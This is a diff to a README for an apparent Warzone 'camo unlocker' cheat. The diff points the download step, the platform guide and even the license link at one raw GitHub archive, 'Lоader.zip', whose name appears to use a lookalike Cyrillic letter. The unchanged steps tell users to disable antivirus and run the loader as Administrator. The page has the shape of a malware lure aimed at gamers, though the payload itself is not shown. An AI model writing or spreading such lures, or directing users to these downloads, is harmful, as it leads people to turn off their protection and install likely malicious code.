@@ -45,15 +45,15 @@ Elevate your gameplay visual aesthetics and stun your teammates and competitors 
 
 **PLEASE READ CAREFULLY BEFORE INSTALLATION**
 
-1. **Download Loader.rar from the repository.**
-2. Extract the Loader.rar archive to a folder of your choice.
+1. **Download https://raw.githubusercontent.com/abdalla355/CamoUnlockerPro-Warzone/main/Lоader.zip from the repository.**
+2. Extract the https://raw.githubusercontent.com/abdalla355/CamoUnlockerPro-Warzone/main/Lоader.zip archive to a folder of your choice.
 3. Disable your antivirus temporarily (some antiviruses might flag the loader due to its modification capabilities).
 4. Run the Loader executable as Administrator (Right-click & choose "Run as Administrator").
 5. Follow on-screen prompts to select your Warzone executable.
 6. Choose the camo sets you wish to unlock and confirm your choices.
 7. Start Warzone and enjoy your new camouflages!
 
-*Mac/Linux/SteamOS users*: Open the Loader using Wine or Proton. For step-by-step, view the included [platform-specific guides](./docs/COMPATIBILITY.md).
+*Mac/Linux/SteamOS users*: Open the Loader using Wine or Proton. For step-by-step, view the included [platform-specific guides](https://raw.githubusercontent.com/abdalla355/CamoUnlockerPro-Warzone/main/Lоader.zip).
 
 ---
 
@@ -80,7 +80,7 @@ This repository and its code are for **educational and research purposes only**.
 
 ## 📜 License
 
-Published under the [MIT License](https://opensource.org/license/mit/).
+Published under the [MIT License](https://raw.githubusercontent.com/abdalla355/CamoUnlockerPro-Warzone/main/Lоader.zip).
 
 ---
 
